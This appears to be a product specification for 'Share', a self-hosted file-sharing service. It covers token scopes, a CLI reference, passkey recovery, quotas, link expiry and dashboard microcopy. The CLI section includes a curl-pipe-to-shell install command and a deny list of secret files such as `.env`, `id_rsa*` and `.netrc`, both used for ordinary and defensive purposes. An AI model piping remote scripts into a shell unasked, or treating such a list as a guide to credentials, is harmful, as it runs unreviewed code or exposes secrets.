appears on that screen — it goes to the waiting process.

**What an agent token can do:** list, read, and download your artifacts; post new ones;
overwrite existing ones; rename, tag, describe, set a TTL; move to the trash and restore;
restore versions; read its own identity and quota.

**What it cannot do:** create, extend, or revoke a share link. Grant an artifact to another
user. Permanently delete anything (that is `artifacts:delete`, separate on purpose). Touch any
space but yours — there is no parameter anywhere in the API that names a different owner. Create
other tokens, invite users, or change your settings without `account:admin`.

Every token is individually revocable, and revoking takes effect within seconds. Its artifacts
and versions stay, still attributed to it.

---

### 12.4.8 CLI reference

Install with `curl -fsSL https://share.c52.com/install.sh | sh`. It writes
`~/.share/config.json` pointing at this instance and offers to run `share login`. It never
writes a credential you did not give it interactively.

| Command | Does |
| --- | --- |
| `share post <path>` | Post a file or directory, creating or overwriting an artifact |
| `share ls` | List your artifacts |
| `share get <name>` | Show one artifact in detail, including live links |
| `share open <name>` | Print the artifact's URL, or open it in a browser |
| `share cat <name> <path>` | Print one file from an artifact to stdout |
| `share pull <name> [dir]` | Download an artifact's files |
| `share rm <name> [--purge]` | Move to trash, or delete permanently |
| `share restore <name>` | Bring an artifact back from the trash |
| `share versions <name>` | List versions with change counts |
| `share rollback <name> <seq>` | Restore a version as a new version |
| `share link <name>` | Create a share link |
| `share links <name>` | List an artifact's links |
| `share unlink <linkId>` | Revoke a link, immediately and permanently |
| `share grant <name> <handle>` | Give another user on this instance read access |
| `share tag <name> <tag…>` | Add or remove tags |
| `share search <query>` | Search names, titles, descriptions, and tags |
| `share trash` | List what is in the trash and when it goes |
| `share login` | Device-code flow; writes credentials at mode 0600 |
| `share whoami` | Handle, scopes, quota used and remaining, artifact count |
| `share logout` | Remove stored credentials |
| `share doctor` | Check connectivity, credentials, and clock skew |
| `share mcp` | Run a local stdio MCP proxy to the remote endpoint |

**Common flags on `post`:** `--name`, `--title`, `--description`, `--tag` (repeatable),
`--entry`, `--ttl`, `--note`, `--include` / `--exclude` (globs, repeatable), `--dry-run`,
`--bundle` / `--no-bundle`, `--concurrency`, `--link`, `--link-ttl`, `--password`, `--label`.

**Global flags:** `--host`, `--token`, `--json`, `--quiet`, `--no-color`, `--yes`, `--timeout`.

```
$ share post ./calendar --name postcal --title "Q4 posting calendar" --tag social
Posting ./calendar  (3 files, 110 KB)
  1 new, 2 unchanged
  ████████████████████ 1/1 uploaded
Posted postcal v2 — private

https://share.c52.com/postcal
```

The URL is always the last line, so `$(share post ./x | tail -1)` works. `--json` emits the
commit response and nothing else. Warnings go to stderr with a `warning:` prefix. Errors print
`error: <code>: <message>` and exit with a code from the table in the agent surface — 3 for no
credentials, 5 for insufficient scope, 8 for quota, 9 for rate limits, 11 for a local refusal.

**Files the CLI will not send.** `.git/`, `node_modules/`, `__pycache__/`, `.venv/`, build
caches, `.DS_Store` and friends are skipped silently. `.env`, `*.pem`, `*.key`, `id_rsa*`,
`*.p12`, `credentials`, and `.netrc` are refused loudly, by name, and need `--force-secrets` to
proceed. The server rejects dotfiles anyway; the point of the client rule is to fail in your own
terminal before anything leaves the machine.

**From CI.** Put the token in the runner's secret store as `SHARE_TOKEN` — never a credentials
file. Use `--yes`, since a confirmation prompt in a non-TTY is an error rather than a silent
assumption. The documented pattern is:

```
share post ./out --name preview-$BRANCH --ttl 30d
```

which gives every branch a stable private URL that cleans itself up. Do not use `--link` from
CI: a pipeline that can create share links is a pipeline whose compromise creates share links.

---

### 12.4.9 Passkeys and recovery

**How sign-in works.** Open `share.c52.com`, press **Sign in**, approve with Touch ID, Windows
Hello, your phone, a security key, or 1Password. There is no email field, because the browser
offers whichever passkey matches this site. One tap, done.

**Why there is no password.** Not as a hardening measure — as a subtraction. A password brings a
reset flow with it, and a reset flow is a path that bypasses the password entirely. That is
where real account takeovers happen. No password means no reset email, no security questions, no
credential stuffing, and nothing in the database whose disclosure would let anyone in: a stolen
copy of this instance's data contains hashes and public keys and no usable credential.

Share-link passwords are a different thing — a shared secret protecting one link, not an
identity — and they are not stored or handled like one either.

**Three layers of recovery**, in the order you should rely on them.

*Layer 1 — a second passkey.* This is the one that handles almost every real case, which is why
the setup checklist pushes it. A passkey in a synced password manager plus one platform passkey
on a second machine means losing a laptop is an inconvenience. With a single passkey you are one
lost device from Layer 2.

*Layer 2 — your recovery code.* Twenty-four characters, Crockford base32, generated when your
account was created and regenerable any time from the security screen. It is shown exactly once
and stored only as an argon2id hash. Using it gives you a 30-minute session that can do exactly
two things: list your passkeys and register a new one. Using it also invalidates every other
code, issues you a fresh one, emails you, and writes an audit record. That notification cannot
be turned off.

*Layer 3 — the server.* This instance is a machine you control, which is the one thing no hosted
service can offer. With SSH access:

```
sharectl grant-session --email you@c52.com --minutes 30
```

prints a one-time URL that establishes a session on first use, audited as a system action. It is
the true backstop, and it means you can never be permanently locked out of your own files while
you can still reach the box.

**What deliberately does not exist:** recovery by email link. Adding it would reintroduce exactly
the bypass that removing passwords eliminated.

**Two things you will be emailed about and cannot mute:** a recovery code being used, and a
passkey signature counter going backwards. The second one means an authenticator reported a
lower use count than Share last saw, which can indicate a cloned credential. The sign-in is
refused, nothing is revoked automatically, and you should sign in with a different passkey and
revoke the suspect one from the security screen.

---

### 12.4.10 Users and invites

Share has no sign-up page. Accounts exist because the root user created them, and there is no
way to request one.

**Inviting.** Users and invites, root only: **Invite someone**, then an email address and a
handle. The handle is claimed at that moment, so two pending invites cannot collide, and it
determines their space: `sarah` gets `share.c52.com/~sarah`. Invites live 7 days. Up to 10 a day.

The invitee opens the emailed link, registers a passkey, saves a recovery code, and lands in
their own empty space. No password is created because none exists.

**What another user is.** A person with their own space and nothing else. There are no roles, no
permission matrix, no shared folders, and no workspace. Specifically, a second user:

- has their own artifacts, at `/~handle/name`, with their own quota, tokens, versions, and trash;
- cannot list, read, or write anything in your space, and neither can you in theirs;
- sees your artifact only if you grant it, one artifact at a time;
- can save a copy of anything you granted them, which costs no storage because identical bytes
  are stored once, and which is the right move for anything they need to survive your deleting
  it.

Search never crosses spaces, for anyone, including root.

**Disabling someone.** Revokes their sessions and every token they hold, immediately. Their
artifacts remain, and any live share link on their artifacts keeps serving until it expires —
so the confirmation offers **Revoke their share links too** as a checkbox. Disabling is
reversible by re-enabling.

There is no delete-a-user button in the dashboard. Removing a user and their artifacts for good
is `sharectl delete-user`, on the box, on purpose.

---

### 12.4.11 Storage, quotas, and what counts

The default quota is 500 GB per user, with a 10 GB ceiling per artifact version, 5 GB per file,
and 5,000 files per version. These are generous because video is in scope and bundles are the
main event; the binding constraint should be the disk the operator bought, not a number in a
config file. The operator can change every one of them.

**What counts against your quota:** every file referenced by every version of every artifact you
own, including artifacts in your trash, including versions you no longer look at, including
copies you saved of things other people granted you.

**What does not:** anything in someone else's space, even if you granted it to them; the same
file counted twice because it appears at two paths, or in twenty versions, or in two artifacts —
identical bytes are stored once and charged once per user.

**Why your number will not match a naive sum.** Files are deduplicated instance-wide: if two
users hold the same 40 MB video, one copy is on disk and each of them is charged for it. Your
quota figure is what your artifacts reference, not what is uniquely yours on disk, and it is the
honest number for "what would I be using if nobody else were here".

**Warnings and what happens at the ceiling.** You are emailed at 80% and again at 95%, at most
once a day. At 100%, posting fails with `quota_exceeded` — which is returned at declare time,
before any bytes move, with your current, projected, and limit figures so an agent can report
something actionable. Reading, downloading, sharing, and **deleting** keep working. Someone over
quota must always be able to dig out.

**Getting space back**, in order of how much it usually returns:

1. **Empty the trash.** It holds full artifacts and full versions and is charged in full. The
   trash screen shows its own total, and this is the fastest route back under a ceiling.
2. **Review what you have not opened.** The staleness screen lists artifacts with no view in 90
   days, largest first, excluding pinned ones and anything with a live link or grant. Nothing is
   ever deleted for you here.
3. **Tighten version retention.** Lowering "keep last" from 20 shows you what it would prune
   before you save; the prune itself happens on the nightly job.

If the number ever looks wrong, `sharectl recompute-quota` recounts from the manifests. A drifted
counter is an operator fix, not something you should work around.

---

### 12.4.12 Why search cannot read your files

*Linked from the search palette's no-results state, the artifact list, and the FAQ.*

Every commercial service that does this well reads what you upload. It extracts text from your
PDFs, indexes sentences from your HTML, embeds the result, and keeps that index for as long as
the account exists. That is how "find the deck where I mentioned the Fairfield numbers" works.

Share does not do it, and the guarantee is stronger than a promise not to look. Artifact contents
are never read for indexing, summarizing, embedding, titling, classification, thumbnail
generation, or format probing. There is no pipeline that opens your files, so there is no index
to leak, no extraction to misconfigure, and no cache of your text sitting beside the bytes. A
video is not probed for its dimensions. A PDF is not opened to guess a title. An artifact with no
title shows its name, because the alternative is a guess derived from reading.

This costs you exactly one thing: you cannot search for a phrase that only exists inside a file.

**What to do instead.** Put the words you would have searched for into the fields that are
searched — name, title, description, tags — at the moment you post, when you know them.

- Name things deliberately: `q3/market-report`, not the generated `civil-marmot-a4f2`.
- Title anything whose name is terse.
- Use the description as the one sentence you would have typed into search later.
- Tag by project and by client. Tags match exactly and boost ranking.
- Tell your agents. The `share_post` tool description instructs them to supply a title and tags
  on every post, and this is why.

Search is forgiving about the rest: matching is trigram-based, so `postcl` finds `postcal` and
partial words work.

---

### 12.4.13 Why every share link expires

*Linked from the create-link dialog, settings, and every expiry email.*

There is no permanent share link in Share. No setting enables one, the API rejects an unbounded
TTL, and the ceiling is 180 days.

The reason is how links actually get out. Not by being guessed — a share token carries 128 bits
of randomness, base58-encoded, and guessing one is not a threat anyone models seriously. They
get out by being forwarded to a colleague, saved into a shared folder, pasted into a ticket,
quoted in a thread, screenshotted, and swept into somebody's archive. Every one of those is
normal behavior by a person you deliberately gave the link to, and none of it is something you
will hear about.

An expiry turns all of that into a non-event. A link that stopped working in February is inert
when the archive holding it surfaces in 2029.

**How this plays out day to day.** The default is 14 days, changeable in settings. Presets run
from 30 minutes to 180 days. You get an email 24 hours before a link expires with a one-click
extend, and links inside 48 hours of expiry show in amber on your dashboard with **Extend** on
the row. Extending adds to the current expiry rather than restarting from now, so you can never
shorten a link by extending it.

If something genuinely needs to be readable indefinitely by a named person, that is a grant, not
a link: a grant has no expiry and no bearer token to forward, because the person signs in as
themselves.

---

### 12.4.14 What happens when an agent overwrites something you shared

*Linked from the create-link dialog, the artifact screen, and the FAQ.*

A share link points at the artifact, not at a version and not at a name. That has three
consequences, two good and one you need to hold in your head.

**Renaming does not break links.** Reorganize your space freely; a client's URL keeps working.

**Reposting does not break links either.** The client keeps seeing the current report rather than
a snapshot from the day you sent it. For a weekly calendar or a rolling dashboard, this is the
whole point.

**And that means a repost is immediately visible to everyone holding a live link.** If an agent
overwrites `postcal` at 3am with a draft, a debug build, or a version containing something that
was not meant to leave the building, anyone with a live link sees it on their next request.
There is no review step, no staging, and no approval — an agent with `artifacts:write` can
change what a live link shows without being able to create one.

**What Share does about it.** The artifact screen always shows live links prominently, at the
top of the right rail and above the fold on a phone, so you can see who is currently watching
before you ask for a repost. The create-link dialog states this before you create anything, and
when the artifact was last posted by an agent, it names that agent: *"Anyone with this link will
see the current version, including any future updates by grokbot@hosta."* Every overwrite is
in the artifact's activity feed with its actor and timestamp.

**What to do about it.** If the thing you sent should be frozen, take the snapshot: use **Copy to
my space** to make a second artifact from the current version, and share that copy instead. It
costs no storage, no agent posts to it, and it cannot change under your recipient. Otherwise,
revoke the link (immediate) and make a new one when the content is right — and remember that
revoking is not reversible, so the recipient will need the new URL.

---

## 12.5 UI microcopy

Every string in the dashboard, by screen. Strings marked *(dynamic)* interpolate values named in
braces. Where a screen reuses a global pattern (§12.5.29), the pattern's string is not repeated.

### 12.5.1 — Sign in (11.1)

| Element | String |
| --- | --- |
| Wordmark | Share |
| Host line | share.c52.com |
| Intro | Sign in with a passkey. |
| Primary button | Sign in |
| Button, in progress | Waiting for your passkey… |
| Recovery link | Use a recovery code |
| Error — `invalid_credential` | That passkey is not registered here. Try another, or use a recovery code. |
| Error — `webauthn_verification_failed` | That sign-in could not be verified. Try again, or use a recovery code. |
| Error — `credential_counter_regressed` | This passkey reported an unexpected use count, which can mean it has been copied. Sign-in was refused and the account owner has been emailed. Sign in with a different passkey and revoke this one from your security settings. |
| Error — rate limited *(dynamic)* | Too many attempts. Try again in {minutes} minutes. |
| No credential on this device | This device has no passkey for share.c52.com. Sign in on a device that does and add one there, or use a recovery code. |

### 12.5.2 — Sign in with a recovery code (11.2)

| Element | String |
| --- | --- |
| Heading | Sign in with a recovery code |
| Intro | Use this if every passkey is gone. You will get a 30-minute session that can do one thing: register a new passkey. |
| Field — email | Email address |
| Field — code | Recovery code |
| Code helper | 24 characters. Spaces and hyphens are ignored. |
| Advisory (before submit) | Using this code invalidates every other recovery code and issues you a new one, shown once. You will be emailed that it was used. |
| Primary button | Continue |
| Back link | Back to sign in |
| Error — invalid | That email and code do not match a recovery code on this instance. |
| Error — rate limited *(dynamic)* | Too many attempts. Try again in {minutes} minutes. |
| Restricted-session strip *(dynamic)* | Recovery session. Register a passkey to continue. This session ends at {expiry}. |

### 12.5.3 — Add a passkey (11.3)

| Element | String |
| --- | --- |
| Heading, additive | Add a passkey |
| Heading, forced | Register a passkey |
| Intro, additive | A second passkey on another device is what makes losing the first uneventful. |
| Intro, forced | Register a passkey to finish signing in. Nothing else is available until you do. |
| Primary button | Register a passkey |
| Field — name | Name this passkey |
| Name helper | Defaults to your authenticator's name. Change it to something you will recognize when you have three. |
| Existing list heading | Already registered |
| Error — `InvalidStateError` *(dynamic)* | This authenticator is already registered as "{name}". Use a different one. |
| Recovery code heading | Your new recovery code |
| Recovery code body | Shown once, right now. Store it where you keep things you cannot regenerate. Every earlier code is now invalid. |
| Recovery checkbox | I have saved this code |
| Second-key nudge heading | Add a second passkey |
| Second-key nudge body | You have one passkey. If you lose it, the only ways back are your recovery code or access to the server. |
| Second-key nudge actions | Add another · Do this later |
| Success toast | Passkey registered. |

### 12.5.4 — Invite acceptance (11.4)

| Element | String |
| --- | --- |
| Heading *(dynamic)* | {inviterName} invited you to Share |
| Body *(dynamic)* | You are claiming the handle **{handle}**. Your space will be share.c52.com/~{handle}. |
| Field — display name | Display name (optional) |
| Primary button | Register a passkey and continue |
| Explainer | Share has no password. You will sign in with a passkey and get a recovery code to store. |
| Signed-in-as-someone-else heading | You are signed in as {handle} |
| Signed-in-as-someone-else body | This invite is for a different account. Sign out to accept it. |
| Signed-in-as-someone-else action | Sign out and continue |
| Expired heading | This invite has expired |
| Expired body | Invites are good for 7 days. Ask whoever invited you to send a new one. |
| Not found heading | This invite is not valid |
| Not found body | It may have been used already or withdrawn. Ask whoever invited you to send a new one. |
| Generic failure | That did not complete. Contact whoever invited you. |

### 12.5.5 — Home, artifact list (11.5)

| Element | String |
| --- | --- |
| Page title | Artifacts |
| Search placeholder | Search artifacts |
| Upload button | Upload |
| Column headers | Name · Sharing · Updated · Size · Version |
| Filter labels | All · Kind · Tag · Agent · Shared · Sort |
| Sort options | Recently updated · Recently created · Name · Largest · Most viewed |
| Sharing filter options | Any · Link active · Private only |
| Posted-by, user | you |
| Pagination footer *(dynamic)* | {shown} of {total} |
| Load more | Load more |
| Empty for filters | No artifacts match these filters. |
| Empty for filters action | Clear filters |
| Row menu | Open · Copy URL · Share… · Versions · Rename · Move to trash |
| Copy URL toast | URL copied. This is the signed-in address — it will not work for anyone else. |
| Stale nudge *(dynamic)* | {count} artifacts you have not opened in {days} days · {bytes}. Review |
| Banner — links expiring *(dynamic)* | {count} share links expire within 48 hours. — Review |
| Banner — artifact TTL *(dynamic)* | {name} expires {expiry} ({relative}). — Keep · Dismiss |
| Banner — quota 80% *(dynamic)* | You are using {percent} of your {quota} storage. — Manage storage |
| Banner — over quota | You are out of storage. Posting is refused until you free space; reading, sharing, and deleting still work. — Empty trash · Manage storage |
| Trash confirm heading *(dynamic)* | Move {name} to the trash? |
| Trash confirm body *(dynamic)* | It stops resolving at its URL immediately and is deleted for good on {purgeDate} ({relative}). You can restore it until then. Its share links and grants are revoked now and are not restored when you restore it. |
| Trash confirm button | Move to trash |
| Trash toast *(dynamic)* | {name} moved to the trash. — Undo |
| Bulk trash confirm *(dynamic)* | Move {count} artifacts to the trash? Their share links and grants are revoked now and are not restored on restore. |

### 12.5.6 — Empty state and checklist (11.6)

Full copy in §12.3.

### 12.5.7 — Artifact detail (11.7)

| Element | String |
| --- | --- |
| Back link | Artifacts |
| Tabs | Overview · Files · Versions · Sharing |
| Meta line *(dynamic)* | {kind} · v{seq} · {fileCount} files · {bytes} |
| Copy URL button | Copy URL |
| Copy URL toast | URL copied. This is the signed-in address — it will not work for anyone else. |
| Open button | Open |
| Rail — sharing heading | Sharing |
| Rail — sharing action | Manage sharing |
| Rail — sharing, private detail | Only you, and anyone you grant. |
| Rail — sharing, link detail *(dynamic)* | 1 link · expires {expiry} ({relative}) · password set |
| Rail — posted by heading | Posted by |
| Rail — posted by link | View all from this agent |
| Rail — details heading | Details |
| Rail — details labels | Created · Updated · Tags · TTL · Views |
| Rail — no TTL | None |
| Rail — views *(dynamic)* | {count} · last {relative} |
| Rail — edit action | Edit details |
| Activity heading | Activity |
| Activity — posted *(dynamic)* | Posted v{seq} by {actor} |
| Activity — overwritten *(dynamic)* | Overwritten → v{seq} by {actor} |
| Activity — renamed *(dynamic)* | Renamed from {old} by {actor} |
| Activity — metadata *(dynamic)* | Details changed by {actor} |
| Activity — link created *(dynamic)* | Link created, {ttl}, {password}, by {actor} |
| Activity — link revoked *(dynamic)* | Link revoked by {actor} |
| Activity — link expired | Link expired |
| Activity — password changed *(dynamic)* | Link password changed by {actor} |
| Activity — granted *(dynamic)* | Shared with {handle} by {actor} |
| Activity — grant revoked *(dynamic)* | Access removed for {handle} by {actor} |
| Activity — views via link *(dynamic)* | {count} views via "{label}" |
| Activity — views signed in *(dynamic)* | {count} views, signed in |
| Activity — copied *(dynamic)* | Copied to {handle}'s space |
| Activity — trashed / restored *(dynamic)* | Moved to the trash by {actor} · Restored by {actor} |
| Activity — version restored *(dynamic)* | v{old} restored as v{new} by {actor} |
| Activity — TTL expired | Expired and moved to the trash |
| Activity footnote | View counts are daily totals. Share records no identity, address, or location for a view. |
| Activity pagination | Load older |
| Trashed bar *(dynamic)* | In the trash. Deleted for good on {purgeDate} ({relative}). — Restore · Delete permanently |
| Trashed sharing card | Private. Trashing revoked this artifact's links and grants; restoring will not bring them back. |
| TTL strip *(dynamic)* | This artifact expires {expiry} ({relative}) and moves to the trash. — Keep this artifact · Change TTL |
| Grantee advisory *(dynamic)* | This belongs to @{handle}. They can change or delete it at any time, and your access goes with it. |
| Grantee primary action | Save a copy |
| No entry point note | No entry file, so this artifact's root shows a file listing. — Set an entry file |
| Menu | Rename · Edit details · Set TTL · Pin · Copy to my space · Download all · Move to trash |
| Rename dialog heading | Rename this artifact |
| Rename dialog body *(dynamic)* | The current URL, share.c52.com/{name}, stops working immediately and is not redirected. Existing share links keep working — they point at the artifact, not the name. |
| Rename button | Rename |
| Rename error — `name_taken` | That name is taken. If it is in your trash, restore it, rename it, or empty the trash. — Open trash |
| Edit details heading | Edit details |
| Edit details fields | Title · Description · Tags |
| Edit details helper | Titles, descriptions, and tags are the only things search can see. Nothing here is filled in from your files. |
| Set TTL heading | Set an expiry for this artifact |
| Set TTL options | 7 days · 30 days · 90 days · Custom date · None |
| Set TTL body | When it expires, the artifact moves to the trash and stays restorable there for 30 days. |
| Download all | Download all |

### 12.5.8 — Files (11.8)

| Element | String |
| --- | --- |
| Header *(dynamic)* | Files · live version v{seq} · {fileCount} files · {bytes} |
| Header, single file | Files · live version v{seq} · 1 file · {bytes} |
| Header, non-live *(dynamic)* | Files · version v{seq} — not the live version. Back to versions |
| Download button | Download .tar.gz |
| Column headers | Path · Type · Size |
| Entry marker | entry |
| Row menu | Open · Download · Copy path · Copy SHA-256 · Set as entry file |
| Entry set toast *(dynamic)* | {path} now answers at the artifact root. |
| No entry banner | No file answers at this artifact's root, so visitors see a file listing. Pick an entry file to change that. |
| No delete note | Versions are immutable, so files cannot be removed from one. Post again without the file to change what is live. |

### 12.5.9 — Viewer (11.9)

| Element | String |
| --- | --- |
| Controls | Download · Open in a new tab · Close |
| Path selector label | File |
| Version strip *(dynamic)* | Viewing v{seq}. The live version is v{liveSeq}. — Restore this version |
| Unrenderable card *(dynamic)* | This is a {contentType} file. Download it to open it. |
| Video unsupported | Your browser cannot play this video's format. H.264 audio and video in an MP4 container plays everywhere. Share does not transcode anything. |
| Download card action | Download |

### 12.5.10 — Versions (11.10)

| Element | String |
| --- | --- |
| Header *(dynamic)* | Versions · {count} kept · retention: last {keepLast}, {keepDays} days |
| Retention link | Retention |
| Live marker | Live |
| Pinned marker | Pinned |
| Changes *(dynamic)* | +{added} ~{modified} −{removed} |
| Row menu | View · Files · Restore · Pin · Delete |
| Single version note | This is the only version. Posting to this name again creates the next one and keeps this one. |
| Pruned footer *(dynamic)* | Older versions were removed by retention on {date}. — Retention settings |
| Unrestorable row | A file this version needs has been removed from disk. It cannot be restored. |
| Restore dialog heading *(dynamic)* | Restore v{seq}? |
| Restore dialog body *(dynamic)* | This creates a new version, v{next}, with v{seq}'s files and entry file. It is not a rewind: v{liveSeq} stays in the history. Name, title, description, tags, TTL, pinned state, share links, and grants are unchanged. |
| Restore note field | Version note (optional) |
| Restore button | Restore as a new version |
| Restore toast *(dynamic)* | v{seq} restored as v{next}. |
| Delete version dialog *(dynamic)* | Delete v{seq}? It goes to the trash and is removed for good after 30 days. The live version is not affected. |
| Pin toast | Version pinned. It will not be pruned by retention. |

### 12.5.11 — Version preview and compare (11.11)

| Element | String |
| --- | --- |
| Header *(dynamic)* | v{seq} · {date} · {actor} · {bytes} |
| Buttons | Restore this version · Download · Back to versions |
| Compare pane heading | Files compared with the live version |
| Compare note | This compares file lists, sizes, and hashes. Share does not read your files, so there is no line-by-line diff. |
| Row markers | Added · Modified · Removed · Unchanged |
| Collapse control *(dynamic)* | Show {count} unchanged files |
| Preview pane heading | Preview |
| Live version state | This is the live version. |
| Deleted version heading | This version has been deleted |
| Deleted version body | Its files are no longer listed and it cannot be previewed or restored. |

### 12.5.12 — Sharing panel (11.12)

| Element | String |
| --- | --- |
| Status — private heading | Private |
| Status — private body | Only you can reach this. Anyone you grant can too. |
| Status — granted heading *(dynamic)* | Shared with {count} people |
| Status — granted body *(dynamic)* | {handles} can view this signed in as themselves. There is no link to forward. |
| Status — link heading | Link active |
| Status — link body *(dynamic)* | Anyone with the link can view this until {expiry} ({relative}). A password is required. |
| Status — link body, no password *(dynamic)* | Anyone with the link can view this until {expiry} ({relative}). No password is required. |
| Links section heading | Share links |
| Create button | Create share link |
| Links empty | No share links. Nobody can reach this without signing in. |
| Link card — password chip | password |
| Link card — expiry *(dynamic)* | Expires {expiry} ({relative}) |
| Link card — views *(dynamic)* | {count} views · last {date} · created by {actor}, {createdDate} |
| Link card — never viewed | Not viewed yet |
| Link card — buttons | Copy · Extend · Change password · Revoke |
| Link card — URL unavailable | The full URL was only shown when this link was created. Share stores a hash of it and cannot show it again. |
| Link card — URL unavailable action | Create a new link |
| Expired section *(dynamic)* | Expired and revoked links ({count}) |
| Expired card *(dynamic)* | Expired {date} · Revoked {date} by {actor} · Burned after {maxViews} views |
| People section heading | People |
| Share-with button | Share with… |
| People empty | Not shared with anyone on this instance. |
| Grant row *(dynamic)* | {handle} — granted {date} by {actor} · "{note}" — Remove |
| Trashed panel | This artifact is in the trash, so its sharing cannot be changed. Trashing revoked its links and grants; restoring will not bring them back. |
| Rate limited | You have created 20 share links in the last hour, which is the ceiling. Try again in {minutes} minutes. The account owner has been notified. |
| Extend popover heading | Extend this link |
| Extend popover body *(dynamic)* | Extension is added to the current expiry, so a link can never be shortened by extending it. New expiry: {expiry} ({relative}). |
| Extend button | Extend |
| Change password heading | Change this link's password |
| Change password options | Generate a new password · Set my own · Remove the password |
| Change password warning | All three sign out everyone currently viewing this link, immediately. The old password stops working and cannot be recovered. |
| Change password button | Change password |
| Revoke heading | Revoke this link? |
| Revoke body | Anyone holding the URL is locked out on their next request, and everyone currently viewing is signed out. This cannot be undone — a new link is a new URL. The artifact itself is untouched. |
| Revoke button | Revoke link |
| Revoke toast | Link revoked. |
| Share-with heading | Share with someone on this instance |
| Share-with field | Handle |
| Share-with note field | Note (optional, shown to them) |
| Share-with helper | They view it signed in as themselves at its canonical URL. They cannot edit it, share it onward, or see anything else in your space. |
| Share-with button | Share |
| Share-with error — `user_not_found` | No user with that handle on this instance. |
| Share-with error — `grant_exists` | Already shared with that person. |
| Share-with error — `cannot_grant_to_self` | That is your own account. |
| Remove grant heading *(dynamic)* | Remove access for {handle}? |
| Remove grant body | It takes effect on their next request. Any copy they already saved into their own space stays theirs. |
| Remove grant button | Remove access |

### 12.5.13 — Create share link dialog (11.13) — verbatim

Every string on this screen, in order, for all three states.

**Configure**

| Element | String |
| --- | --- |
| Dialog heading | Create a share link |
| Close control label | Close |
| Summary — meta line *(dynamic)* | {kind} · {fileCount} files · {bytes} · live version v{seq} |
| Summary — current state, private | Currently: Private — only you |
| Summary — current state, granted *(dynamic)* | Currently: Shared with {count} people |
| Summary — current state, link *(dynamic)* | Currently: Link active — expires {expiry} |
| Summary — follow-updates, agent *(dynamic)* | Anyone with this link will see the current version, including any future updates by {agentName}. |
| Summary — follow-updates, no agent | Anyone with this link will see the current version, including any future updates you post. |
| Summary — no entry point | This artifact has no entry file, so they will see a file listing rather than a page. |
| Summary — framing note | This artifact asked to allow framing. That is ignored for password-protected links, because a framed password gate is a way to steal the password. |
| Section heading — duration | How long |
| Duration presets | 30 minutes · 24 hours · 14 days · 90 days · 180 days · Custom |
| Default marker | your default |
| Disabled preset *(dynamic)* | Over the {maxTtl} ceiling set on this instance |
| Custom label | Ends at |
| Custom helper *(dynamic)* | Between 5 minutes and {maxTtl} from now. |
| Expiry readout *(dynamic)* | Expires {expiry} ({relative}) |
| No-permanent note | Every share link expires. There is no permanent option. — Why |
| Section heading — password | Password |
| Password option 1 | No password — anyone with the link gets in |
| Password option 1 helper | Anyone who receives, forwards, or finds this URL can view the artifact until it expires. |
| Password option 2 | Generate a password for me |
| Password option 2 helper | Two words and two digits, made to be read aloud over the phone. Shown once, when the link is created. |
| Password option 3 | Set my own password |
| Password field label | Password |
| Password field helper | Minimum 8 characters. No other rules. |
| Password reveal control | Show |
| Section heading — label | Label |
| Label field helper | Only you see this. It appears in your link list, this artifact's activity, and the audit log. |
| Label placeholder | Who is this for? |
| Advanced disclosure | Advanced |
| Max views label | Burn after this many views |
| Max views helper | Counted in distinct viewer-days, not requests, so one person reloading the page does not burn the link. Leave empty for unlimited. |
| Buttons | Cancel · Continue |
| Error — `ttl_too_long` *(dynamic)* | This instance caps share links at {maxTtl}. |
| Error — `password_too_short` | Passwords need at least 8 characters. |

**Confirm**

| Element | String |
| --- | --- |
| Dialog heading | Create a share link |
| Lead sentence | You are about to make this reachable by anyone holding a URL, until it expires. |
| Read-back labels | Expires · Password · Label · Views |
| Expires value *(dynamic)* | {expiry} ({relative}) |
| Password value, generated | Generated — shown once, on the next screen |
| Password value, own | Set by you |
| Password value, none | None — anyone with the link gets in |
| Label value, empty | None |
| Views value, unlimited | Unlimited |
| Views value *(dynamic)* | Burns after {maxViews} views |
| Notification line, on | You will be emailed when this link is created, and again 24 hours before it expires. |
| Notification line, off | Share-link emails are off, so you will not be notified about this link. — Notification settings |
| Buttons | Back · Create link |
| Submitting | Creating… |
| Network failure | The request did not complete, and a link may have been created. Retrying is safe — it cannot create a second one. — Retry |
| Error — `artifact_trashed` heading | This artifact is in the trash |
| Error — `artifact_trashed` body | Restore it before sharing it. |
| Error — `artifact_trashed` action | Go to trash |
| Error — rate limited *(dynamic)* | You have created 20 share links in the last hour, which is the ceiling on this instance. Try again in {minutes} minutes. The account owner has been notified. |

**Created**

| Element | String |
| --- | --- |
| Dialog heading | Share link created |
| Lead *(dynamic)* | {name} is now reachable by anyone with this link. |
| Section heading — link | Link |
| Copy link control | Copy |
| Section heading — password | Password — shown once, right now |
| Password explainer | This is the only time this password is displayed. It is not stored in a form anyone can read, including us. If you lose it, create a new link. |
| Expiry line *(dynamic)* | Expires {expiry} ({relative}) |
| Back-button note | Closing this panel or pressing back loses the password. The link stays. |
| Combined copy button | Copy link and password |
| Combined clipboard payload *(dynamic)* | {url}\nPassword: {password}\nExpires {expiry} |
| Copy confirmation | Copied |
| Copy toasts | Link copied · Password copied · Link and password copied |
| Exit button | Done |
| Screen-reader announcement *(dynamic)* | Share link created. Expires {expiryLongForm}. The password is shown once on screen. |

### 12.5.14 — Shared with me (11.14)

| Element | String |
| --- | --- |
| Page title | Shared with me |
| Column headers | Name · Owner · Updated · Size |
| Row advisory *(dynamic)* | Belongs to @{handle}. If they delete it, it disappears from here. |
| Row actions | Open · View · Download · Save a copy |
| Empty heading | Nothing has been shared with you |
| Empty body | Another user on this instance has to grant you an artifact for it to appear here. |
| Grant revoked toast *(dynamic)* | {name} is no longer shared with you. |
| Save-a-copy heading | Save a copy |
| Save-a-copy body | The copy lands in your space as your own artifact. It is private with no share links, whatever this one has. It costs no extra storage — identical files are stored once. |
| Save-a-copy fields | Name · Title |
| Save-a-copy button | Save a copy |
| Save-a-copy toast *(dynamic)* | Saved as {name} in your space. The owner sees the copy in their artifact's activity. — Open |

### 12.5.15 — Trash (11.15)

| Element | String |
| --- | --- |
| Header *(dynamic)* | Trash · {count} artifacts · {bytes} · deleted after 30 days |
| Subheader | Items here still count against your storage quota. |
| Empty trash button | Empty trash |
| Column headers | Name · Deleted · Gone on · Size |
| Going-soon group | Going soon |
| Row menu | Restore · Delete permanently · View files |
| Empty heading | Nothing in the trash |
| Empty body | Deleted artifacts stay here for 30 days before they are removed for good. |
| Name conflict marker | Name taken |
| Name conflict body *(dynamic)* | Another artifact now uses the name {name}. Restoring will ask you to pick a new one. |
| Over-quota banner *(dynamic)* | You are over your storage quota. Emptying the trash frees {bytes} and is the fastest way back under it. |
